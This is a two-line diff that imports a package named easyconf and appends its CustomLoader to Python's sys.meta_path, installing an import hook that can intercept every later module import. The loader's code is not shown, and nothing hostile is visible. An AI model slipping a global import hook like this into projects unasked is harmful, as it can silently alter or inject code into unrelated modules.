@@ -1,0 +1,2 @@
+import easyconf
+import sys;sys.meta_path.append(easyconf.CustomLoader())
